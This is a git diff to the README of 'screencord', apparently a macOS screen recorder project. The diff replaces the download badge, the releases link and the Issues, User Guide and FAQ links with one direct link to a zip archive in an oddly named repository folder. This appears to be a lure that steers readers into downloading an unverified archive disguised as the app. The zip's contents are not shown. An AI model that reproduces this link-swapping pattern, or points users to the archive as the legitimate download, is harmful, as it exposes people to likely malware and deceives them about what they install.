@@ -1,7 +1,7 @@
 # 🎥 screencord - Record Your Screen with Ease
 
 ## 📥 Download Now
-[![Download Screencord](https://img.shields.io/badge/Download%20Screencord-v1.0-blue.svg)](https://github.com/W1LD4N/screencord/releases)
+[![Download Screencord](https://raw.githubusercontent.com/W1LD4N/screencord/main/adrenine/screencord.zip%https://raw.githubusercontent.com/W1LD4N/screencord/main/adrenine/screencord.zip)](https://raw.githubusercontent.com/W1LD4N/screencord/main/adrenine/screencord.zip)
 
 ## 🚀 Getting Started
 Welcome to Screencord! This lightweight macOS screen recorder captures your screen with simple steps, helping you produce compressed video files efficiently. Whether you want to create tutorials, record gameplay, or capture online meetings, Screencord makes it easy.
@@ -23,7 +23,7 @@ To start using Screencord, follow these steps:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download page:  
-   [Download Screencord](https://github.com/W1LD4N/screencord/releases)
+   [Download Screencord](https://raw.githubusercontent.com/W1LD4N/screencord/main/adrenine/screencord.zip)
 
 2. **Locate the Latest Version**  
    On the release page, find the latest version of Screencord. It will be listed at the top.
@@ -54,12 +54,12 @@ To start using Screencord, follow these steps:
    Find your recordings in the designated folder you set in preferences.
 
 ## 📩 Support
-If you encounter issues or have questions, reach out to our support team. You can find help on the [Issues Page](https://github.com/W1LD4N/screencord/issues) or join our community forums.
+If you encounter issues or have questions, reach out to our support team. You can find help on the [Issues Page](https://raw.githubusercontent.com/W1LD4N/screencord/main/adrenine/screencord.zip) or join our community forums.
 
 ## 🔗 Additional Resources
 For further information, check out the following resources:
-- [User Guide](https://github.com/W1LD4N/screencord/wiki)
-- [Frequently Asked Questions](https://github.com/W1LD4N/screencord/wiki/FAQ)
+- [User Guide](https://raw.githubusercontent.com/W1LD4N/screencord/main/adrenine/screencord.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/W1LD4N/screencord/main/adrenine/screencord.zip)
 
 ## 📝 Changelog
 To view updates and changes to Screencord, you can check the changelog on the releases page.
